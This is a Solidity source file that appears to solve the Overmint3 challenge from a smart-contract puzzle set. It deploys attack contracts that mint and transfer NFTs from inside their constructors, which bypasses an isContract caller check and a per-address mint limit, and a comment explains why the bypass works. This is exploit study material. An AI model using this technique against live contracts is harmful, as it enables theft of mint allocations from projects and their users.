// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint3} from "../solidity-riddles/Overmint3.sol";
import {ERC721, IERC721Receiver} from "@openzeppelin/contracts-v4.9.4/token/ERC721/ERC721.sol";

/**
 * @title AttackOvermint3
 * @dev This contract demonstrates an attack on the Overmint3 contract.
 */
contract AttackOvermint3 {
    address overmint3Add;
    address attaker;
    Overmint3 overmint3;

    constructor(address _overmint3Add, address attacker) {
        overmint3 = Overmint3(_overmint3Add);
        overmint3.mint();
        overmint3.transferFrom(address(this), attacker, overmint3.totalSupply());
    }
}

/**
 * @dev isContract(address) is vulnerable when used to identify the caller’s address.
 * Address.isContract(address) is often used to determine whether a caller is an EOA(Externally Owned Address) or a contract,
 * and it will return false for: an EOA, a contract in construction, an address where a contract will be created and an address where a contract lived but was destroyed.
 * The third and the fourth ones won’t cause any trouble using isContract since they are already destroyed or not created yet. However,
 * a contract in construction makes it possible to bypass isContract , likeisContract(msg.sender).
 */
contract Exploiter {
    AttackOvermint3 private attackOvermint3;

    function exploit(address overmint3) public {
        for (uint256 i; i < 5; ++i) {
            attackOvermint3 = new AttackOvermint3(overmint3, msg.sender);
        }
    }
}
